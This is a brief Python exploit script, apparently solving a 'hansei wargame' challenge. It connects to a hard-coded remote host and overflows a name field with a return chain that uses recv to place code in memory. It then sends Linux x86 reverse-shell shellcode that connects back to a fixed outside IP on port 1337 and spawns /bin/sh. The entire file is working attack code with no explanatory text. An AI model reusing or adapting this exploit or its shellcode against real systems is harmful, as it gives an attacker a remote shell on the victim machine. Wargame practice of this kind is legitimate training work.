# hansei wargame
from err0rless import *
import struct

#s, t = connst("192.168.95.150", 13134)
s, t = connst("59.6.159.144", 62002)

# linux x86 reverse shellcode 
sc = "\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53" + \
	 "\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66" + \
	 "\x68\xD3\xAC\xF6\x4A" + \
	 "\x66\x68\x05\x39" + \
	 "\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89" + \
	 "\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0" + \
	 "\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89" + \
	 "\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62" + \
	 "\x69\x6E\x89\xE3\xCD\x80"

for i in range(10):
	print t.read_until("[y/n] :")
	s.send("y\n")

p  = "A" * 56
p += struct.pack("I", 0x080486A0) # recv
p += struct.pack("I", 0x0804D06C) # .data
p += struct.pack("I", 0x00000004) # fd
p += struct.pack("I", 0x0804D06C) # .data
p += struct.pack("I", len(sc))
p += struct.pack("I", 0x00000000) # flag

print t.read_until("Name : ")
s.send(p + "\n")

s.send(sc)